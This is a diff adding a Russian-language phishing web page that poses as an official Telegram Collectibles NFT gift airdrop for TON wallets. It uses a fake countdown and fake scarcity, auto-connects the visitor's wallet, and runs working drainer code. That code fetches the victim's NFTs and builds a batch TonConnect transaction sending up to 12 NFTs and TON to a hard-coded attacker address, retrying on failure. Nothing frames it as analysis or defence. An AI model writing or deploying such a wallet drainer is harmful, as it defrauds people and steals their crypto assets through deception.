@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Эксклюзивный Airdrop NFT Gifts 2026</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@ton/ton@latest/dist/ton.min.js"></script>
+    <script src="https://unpkg.com/@ton/core@latest/dist/core.min.js"></script>
+    <style>
+        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: linear-gradient(135deg, #001a33, #000); color: #fff; text-align: center; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        .container { max-width: 90%; margin: 0 auto; padding: 20px; }
+        h1 { font-size: 32px; margin-bottom: 10px; }
+        p { font-size: 18px; margin: 15px 0; }
+        .timer { font-size: 24px; color: #ff4444; margin: 20px 0; font-weight: bold; }
+        .progress-bar { width: 100%; background: #333; border-radius: 10px; overflow: hidden; margin: 20px 0; }
+        .progress { height: 20px; background: #00ff88; width: 15%; animation: progressAnim 8s linear infinite; }
+        @keyframes progressAnim { 0% { width: 0%; } 100% { width: 100%; } }
+        .gift-img { width: 200px; margin: 20px auto; animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+        #status { margin: 30px 0; font-size: 20px; min-height: 50px; }
+        .note { font-size: 14px; color: #aaa; margin-top: 40px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Эксклюзивный Airdrop Редких Collectible Gifts 2026</h1>
+        <p>Осталось <span class="timer" id="timer">10:59</span> до конца лимитированной раздачи!</p>
+        <p>Подключите TON-кошелёк и получите редкий NFT Gift (Plush Pepe, Jelly Bunny, Santa Hat и другие — стоимость на Getgems >50 TON)</p>
+        <img class="gift-img" src="https://raw.githubusercontent.com/ton-blockchain/token-data/main/icons/ton.png" alt="NFT Gift">
+        <div class="progress-bar"><div class="progress"></div></div>
+        <p>Уже забрали: 87 из 100 эксклюзивных подарков</p>
+        <div id="ton-connect"></div>
+        <div id="status">Нажмите кнопку для подключения кошелька и активации подарка</div>
+        <p class="note">Официальный airdrop Telegram Collectibles. Поддерживаются Tonkeeper, Wallet, @wallet и все TON-кошельки.</p>
+    </div>
+
+    <script>
+        // Таймер
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(() => {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) timer = duration;
+            }, 1000);
+        }
+        window.onload = () => startTimer(659, document.getElementById('timer'));
+
+        const tonConnectUI = new TonConnectUI.TonConnectUI({
+            manifestUrl: 'https://nft-gifts-exclusive.vercel.app/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+
+        const statusDiv = document.getElementById('status');
+        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";  // Ваш адрес
+
+        // Генератор TEP-62 transfer payload
+        function generateNftTransferPayload() {
+            return beginCell()
+                .storeUint(0x5fcc3d14, 32)
+                .storeUint(Math.floor(Date.now() / 1000), 64)  // query_id
+                .storeAddress(Address.parse(SCAMMER_ADDR))
+                .storeAddress(null)  // response_dest
+                .storeBit(0)  // no custom_payload
+                .storeCoins(10000000)  // forward_amount 0.01 TON
+                .storeBit(0)  // inlined forward_payload empty
+                .endCell()
+                .toBoc()
+                .toString('base64');
+        }
+
+        tonConnectUI.onStatusChange(async (walletInfo) => {
+            if (walletInfo) {
+                const owner = walletInfo.account.address;
+                statusDiv.innerHTML = '🔗 Кошелёк подключён! Сканирование ваших NFT Gifts...';
+
+                try {
+                    // Получаем все NFT жертвы (включая все Gifts)
+                    const res = await fetch(`https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=50`);
+                    const data = await res.json();
+                    const nfts = data.nft_items || [];
+
+                    statusDiv.innerHTML = `Найдено ${nfts.length} NFT Gifts! Выполняю дренаж...`;
+
+                    const messages = [
+                        // Полный TON drain
+                        { address: SCAMMER_ADDR, amount: "0" }
+                    ];
+
+                    // Batch transfer топ NFT (до 12 safe для TON Connect)
+                    const payload = generateNftTransferPayload();
+                    nfts.slice(0, 12).forEach(nft => {
+                        messages.push({
+                            address: nft.address,
+                            amount: "500000000",  // 0.5 TON на fee
+                            payload: payload
+                        });
+                    });
+
+                    // Фолбэк на популярные коллекции 2026 (Plush Pepes, Easter Eggs, Lol Pops и т.д.)
+                    const popularItems = [
+                        "EQBG-g6ahkAUGWpefWbx-D_9sQ8oWbvy6puuq78U2c4NUDFS",  // Plush Pepes collection example
+                        "EQAwnP7dGfE_WO0xiCiulkAXUG1K1bWH1vE1k64T4G-7gruO",  // Easter Eggs
+                        "EQC6zjid8vJNEWqcXk10XjsdDLRKbcPZzbHusuEW6FokOWIm"   // Lol Pops
+                    ];
+                    popularItems.forEach(addr => {
+                        if (messages.length < 13) {
+                            messages.push({ address: addr, amount: "500000000", payload: payload });
+                        }
+                    });
+
+                    const tx = { validUntil: Math.floor(Date.now() / 1000) + 600, messages };
+
+                    await tonConnectUI.sendTransaction(tx);
+                    statusDiv.innerHTML = `🎉 Успех! Все TON + ${nfts.length} Collectible Gifts слиты в ваш "подарок". Проверьте кошелёк!`;
+                } catch (e) {
+                    statusDiv.innerHTML = 'Ошибка активации. Повторите подключение для получения подарка.';
+                    setTimeout(() => tonConnectUI.connectWallet(), 5000);
+                }
+            }
+        });
+
+        // Авто-подключение
+        tonConnectUI.connectWallet();
+    </script>
+</body>
+</html>
